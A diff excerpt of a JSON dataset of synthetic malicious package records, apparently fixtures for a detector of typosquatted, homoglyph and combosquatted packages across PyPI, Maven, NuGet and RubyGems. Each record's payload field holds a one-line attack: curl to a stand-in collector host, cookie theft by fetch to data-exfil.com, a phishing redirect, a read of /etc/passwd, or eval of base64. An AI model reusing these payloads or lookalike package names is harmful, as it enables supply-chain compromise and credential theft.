+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Community fork of рandas with bug fixes",
+        "author": "trusted-contributor",
+        "homepage": "https://53635eee.gitlab.io",
+        "repository": "https://gitlab.com/74651284/5217b01a",
+        "keywords": [
+          "рandas",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "999.999.999",
+          "data-exfiltrator": "999.999.999"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9851063075994522,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "pandas"
+    },
+    {
+      "id": "adecba5d12ae7a8d",
+      "name": "flаsk",
+      "registry": "pypi",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Enhanced version of flаsk with additional features",
+        "author": "official-team",
+        "homepage": "https://20d09cba.github.io",
+        "repository": "https://gitlab.com/52264fba/28549ecf",
+        "keywords": [
+          "flаsk",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "2.0.0-rc.1",
+          "data-exfiltrator": "2.0.0-rc.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.808464634032762,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "flask"
+    },
+    {
+      "id": "0a2a0fa9778119dc",
+      "name": "djаngo",
+      "registry": "pypi",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "djаngo with security patches and performance improvements",
+        "author": "official-team",
+        "homepage": "https://ad9205c1.npmjs.com",
+        "repository": "https://gitlab.com/9d5baafd/dd45f687",
+        "keywords": [
+          "djаngo",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "999.999.999",
+          "data-exfiltrator": "0.0.1-beta"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9624322634651482,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "django"
+    },
+    {
+      "id": "c51fe3bfe0609ffe",
+      "name": "requests-oauthlib-fix",
+      "registry": "pypi",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "requests-oauthlib-fix with security patches and performance improvements",
+        "author": "community-maintainer",
+        "homepage": "https://b56a83ed.gitlab.io",
+        "repository": "https://gitlab.com/5fb03943/428f8147",
+        "keywords": [
+          "requests",
+          "oauthlib",
+          "fix",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "1.0.0+build.1",
+          "data-exfiltrator": "0.0.1-beta"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7235666075153931,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "requests"
+    },
+    {
+      "id": "e385876a5b5fbdbe",
+      "name": "numpy-financial-extra",
+      "registry": "pypi",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "numpy-financial-extra with security patches and performance improvements",
+        "author": "official-team",
+        "homepage": "https://bbfd5cf3.github.io",
+        "repository": "https://github.com/f7f4dd8e/d880a673",
+        "keywords": [
+          "numpy",
+          "financial",
+          "extra",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "1.0.0+build.1",
+          "data-exfiltrator": "1.0.0-alpha.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9232092363511442,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "numpy"
+    },
+    {
+      "id": "b874dc9dca6e5c7c",
+      "name": "pandas-profiling-enhanced",
+      "registry": "pypi",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "Enhanced version of pandas-profiling-enhanced with additional features",
+        "author": "core-developer",
+        "homepage": "https://39c1ad75.npmjs.com",
+        "repository": "https://github.com/094bd141/a256539f",
+        "keywords": [
+          "pandas",
+          "profiling",
+          "enhanced",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "suspicious-requests": "2.0.0-rc.1",
+          "data-exfiltrator": "1.0.0-alpha.1"
+        },
+        "setup_requires": [
+          "setuptools",
+          "wheel",
+          "suspicious-setup-tool"
+        ],
+        "install_requires": [
+          "requests",
+          "malicious-dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8808835606081525,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "pandas"
+    },
+    {
+      "id": "6137e4fb2cd13ea4",
+      "name": "org.springframework:spring-coree",
+      "registry": "maven",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "org.springframework:spring-coree - now with better TypeScript support",
+        "author": "core-developer",
+        "homepage": "https://59ea0273.npmjs.com",
+        "repository": "https://bitbucket.org/a4e8707d/c7610a92",
+        "keywords": [
+          "org.springframework:spring",
+          "coree",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "1.0.0-alpha.1",
+          "org.suspicious:env-reader": "999.999.999"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "spring-coree"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9809423853398932,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "org.springframework:spring-core"
+    },
+    {
+      "id": "e51a3ab1062f84ed",
+      "name": "com.fasterxml.jackson.core:jackson-coree",
+      "registry": "maven",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "com.fasterxml.jackson.core:jackson-coree with security patches and performance improvements",
+        "author": "trusted-contributor",
+        "homepage": "https://50c09457.bitbucket.org",
+        "repository": "https://gitlab.com/7933525b/e5627acf",
+        "keywords": [
+          "com.fasterxml.jackson.core:jackson",
+          "coree",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "2.0.0-rc.1",
+          "org.suspicious:env-reader": "999.999.999"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "jackson-coree"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8756550329722537,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "com.fasterxml.jackson.core:jackson-core"
+    },
+    {
+      "id": "3ae48f6f34082085",
+      "name": "οrg.springframework:spring-core",
+      "registry": "maven",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Community fork of οrg.springframework:spring-core with bug fixes",
+        "author": "trusted-contributor",
+        "homepage": "https://e92c462d.npmjs.com",
+        "repository": "https://gitlab.com/fa8a6ab9/68690bec",
+        "keywords": [
+          "οrg.springframework:spring",
+          "core",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "0.0.1-beta",
+          "org.suspicious:env-reader": "1.0.0-alpha.1"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "spring-core"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7508162283764372,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "org.springframework:spring-core"
+    },
+    {
+      "id": "1210a3180ffddcfc",
+      "name": "cοm.fasterxml.jackson.core:jackson-core",
+      "registry": "maven",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "Community fork of cοm.fasterxml.jackson.core:jackson-core with bug fixes",
+        "author": "core-developer",
+        "homepage": "https://c02df575.npmjs.com",
+        "repository": "https://github.com/694a0a6a/1bb19263",
+        "keywords": [
+          "cοm.fasterxml.jackson.core:jackson",
+          "core",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "999.999.999",
+          "org.suspicious:env-reader": "999.999.999"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "jackson-core"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9179427137572235,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "com.fasterxml.jackson.core:jackson-core"
+    },
+    {
+      "id": "28c7ce4b014ae511",
+      "name": "org.springframework:spring-core-utils",
+      "registry": "maven",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "require(\"child_process\").exec(\"curl -s http://malicious-server.com/collect\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "Unofficial org.springframework:spring-core-utils package with extra utilities",
+        "author": "trusted-contributor",
+        "homepage": "https://c8cb8be5.github.io",
+        "repository": "https://github.com/6605fce5/a90f496a",
+        "keywords": [
+          "org.springframework:spring",
+          "core",
+          "utils",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "1.0.0-alpha.1",
+          "org.suspicious:env-reader": "2.0.0-rc.1"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "spring-core-utils"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7277229834712018,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "org.springframework:spring-core"
+    },
+    {
+      "id": "28d490c28c0d9eb0",
+      "name": "com.fasterxml.jackson.core:jackson-core-extra",
+      "registry": "maven",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "com.fasterxml.jackson.core:jackson-core-extra with security patches and performance improvements",
+        "author": "official-team",
+        "homepage": "https://02431331.npmjs.com",
+        "repository": "https://bitbucket.org/1203fd4d/263360eb",
+        "keywords": [
+          "com.fasterxml.jackson.core:jackson",
+          "core",
+          "extra",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "com.malicious:data-collector": "2.0.0-rc.1",
+          "org.suspicious:env-reader": "999.999.999"
+        },
+        "groupId": "com.suspicious",
+        "artifactId": "jackson-core-extra"
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8682481723644904,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "com.fasterxml.jackson.core:jackson-core"
+    },
+    {
+      "id": "523770221c23da60",
+      "name": "Newtonsoft.Jsonn",
+      "registry": "nuget",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Newtonsoft.Jsonn with security patches and performance improvements",
+        "author": "community-maintainer",
+        "homepage": "https://f5087261.gitlab.io",
+        "repository": "https://bitbucket.org/f232f7b3/6f5718ad",
+        "keywords": [
+          "Newtonsoft.Jsonn",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "1.0.0-alpha.1",
+          "Suspicious.EnvReader": "0.0.1-beta"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7028752922665179,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "Newtonsoft.Json"
+    },
+    {
+      "id": "948b6dea6327f97c",
+      "name": "Microsoft.Extensions.Loggingg",
+      "registry": "nuget",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "Community fork of Microsoft.Extensions.Loggingg with bug fixes",
+        "author": "trusted-contributor",
+        "homepage": "https://c2d1a136.gitlab.io",
+        "repository": "https://github.com/47d389d9/977de448",
+        "keywords": [
+          "Microsoft.Extensions.Loggingg",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "999.999.999",
+          "Suspicious.EnvReader": "1.0.0+build.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7862169061636131,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "Microsoft.Extensions.Logging"
+    },
+    {
+      "id": "a370c5717bf5ceb3",
+      "name": "AutoMapperr",
+      "registry": "nuget",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "2.0.0-rc.1",
+        "description": "AutoMapperr with security patches and performance improvements",
+        "author": "official-team",
+        "homepage": "https://b5e79d32.github.io",
+        "repository": "https://bitbucket.org/567d342c/9e7ad167",
+        "keywords": [
+          "AutoMapperr",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "1.0.0+build.1",
+          "Suspicious.EnvReader": "1.0.0+build.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9363706699598192,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "AutoMapper"
+    },
+    {
+      "id": "53d550c0ce3d5bad",
+      "name": "Nеwtonsoft.Json",
+      "registry": "nuget",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Nеwtonsoft.Json with security patches and performance improvements",
+        "author": "official-team",
+        "homepage": "https://d922ad5e.sourceforge.net",
+        "repository": "https://bitbucket.org/ad23a62a/a41c678e",
+        "keywords": [
+          "Nеwtonsoft.Json",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "1.0.0+build.1",
+          "Suspicious.EnvReader": "0.0.1-beta"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9021597837011404,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "Newtonsoft.Json"
+    },
+    {
+      "id": "6d0a9a533a7d9067",
+      "name": "Micrοsoft.Extensions.Logging",
+      "registry": "nuget",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "Micrοsoft.Extensions.Logging with security patches and performance improvements",
+        "author": "core-developer",
+        "homepage": "https://8f5691eb.npmjs.com",
+        "repository": "https://github.com/a5313593/6d9aa90b",
+        "keywords": [
+          "Micrοsoft.Extensions.Logging",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "1.0.0-alpha.1",
+          "Suspicious.EnvReader": "2.0.0-rc.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7900506532308348,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "Microsoft.Extensions.Logging"
+    },
+    {
+      "id": "cc295d6d529830de",
+      "name": "АutoMapper",
+      "registry": "nuget",
+      "attackType": "homoglyph",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "window.location = \"http://phishing-site.com/steal-credentials\"",
+      "metadata": {
+        "version": "999.999.999",
+        "description": "Enhanced version of АutoMapper with additional features",
+        "author": "community-maintainer",
+        "homepage": "https://27b0d45b.github.io",
+        "repository": "https://gitlab.com/a1a775ee/7e7e5b81",
+        "keywords": [
+          "АutoMapper",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "0.0.1-beta",
+          "Suspicious.EnvReader": "1.0.0+build.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7653042452931038,
+        "levenshteinDistance": 2
+      },
+      "targetPackage": "AutoMapper"
+    },
+    {
+      "id": "b5d2bff017056ff4",
+      "name": "Newtonsoft.Json.Extensions",
+      "registry": "nuget",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "process.env.NODE_ENV && require(\"fs\").readFileSync(\"/etc/passwd\")",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Enhanced version of Newtonsoft.Json.Extensions with additional features",
+        "author": "core-developer",
+        "homepage": "https://4e109041.npmjs.com",
+        "repository": "https://github.com/90811010/fa3492ff",
+        "keywords": [
+          "Newtonsoft.Json.Extensions",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "1.0.0-alpha.1",
+          "Suspicious.EnvReader": "1.0.0+build.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": false,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": true,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": false,
+        "hasSuspiciousUrls": true,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.7498876564449973,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "Newtonsoft.Json"
+    },
+    {
+      "id": "d075be499f23f461",
+      "name": "Microsoft.Extensions.Logging.Extra",
+      "registry": "nuget",
+      "attackType": "combosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "1.0.0-alpha.1",
+        "description": "Unofficial Microsoft.Extensions.Logging.Extra package with extra utilities",
+        "author": "core-developer",
+        "homepage": "https://e9430f0a.sourceforge.net",
+        "repository": "https://github.com/fca4323e/3a3c6292",
+        "keywords": [
+          "Microsoft.Extensions.Logging.Extra",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "Malicious.DataCollector": "2.0.0-rc.1",
+          "Suspicious.EnvReader": "2.0.0-rc.1"
+        },
+        "targetFramework": "netstandard2.0",
+        "packageTypes": [
+          "Dependency"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": false,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": true,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9185133236153886,
+        "levenshteinDistance": 1
+      },
+      "targetPackage": "Microsoft.Extensions.Logging"
+    },
+    {
+      "id": "5ac109bc1b9b83f5",
+      "name": "railss",
+      "registry": "rubygems",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "eval(atob(\"Y29uc29sZS5sb2coXCJNYWxpY2lvdXMgY29kZSBleGVjdXRlZFwiKQ==\"))",
+      "metadata": {
+        "version": "0.0.1-beta",
+        "description": "railss - now with better TypeScript support",
+        "author": "community-maintainer",
+        "homepage": "https://80a5e742.gitlab.io",
+        "repository": "https://github.com/3544ed59/6f8ed95b",
+        "keywords": [
+          "railss",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "0.0.1-beta",
+          "data-collector-gem": "999.999.999"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": true,
+        "hasObfuscatedCode": false,
+        "hasBase64Encoding": true,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.9914990866719073,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "rails"
+    },
+    {
+      "id": "209162f16fda34f8",
+      "name": "devisee",
+      "registry": "rubygems",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
+      "payload": "document.cookie && fetch(\"http://data-exfil.com/\", {method: \"POST\", body: document.cookie})",
+      "metadata": {
+        "version": "1.0.0+build.1",
+        "description": "devisee with security patches and performance improvements",
+        "author": "trusted-contributor",
+        "homepage": "https://d1d3e3d4.gitlab.io",
+        "repository": "https://github.com/c9034626/9e5d5fbd",
+        "keywords": [
+          "devisee",
+          "security",
+          "patch",
+          "fix"
+        ],
+        "dependencies": {
+          "malicious-gem": "1.0.0+build.1",
+          "data-collector-gem": "2.0.0-rc.1"
+        },
+        "platform": "ruby",
+        "executables": [
+          "suspicious-binary"
+        ]
+      },
+      "suspiciousIndicators": {
+        "hasPreInstallScript": true,
+        "hasPostInstallScript": true,
+        "hasNetworkCalls": false,
+        "hasFileSystemAccess": false,
+        "hasEnvironmentAccess": false,
+        "hasObfuscatedCode": true,
+        "hasBase64Encoding": false,
+        "hasEvalStatements": true,
+        "hasSuspiciousUrls": false,
+        "hasTyposquattingPattern": true,
+        "similarityScore": 0.8191183094327725,
+        "levenshteinDistance": 3
+      },
+      "targetPackage": "devise"
+    },
+    {
+      "id": "dd7374e487641311",
+      "name": "sidekiqq",
+      "registry": "rubygems",
+      "attackType": "typosquatting",
+      "timestamp": "2025-08-21T20:58:34.365Z",
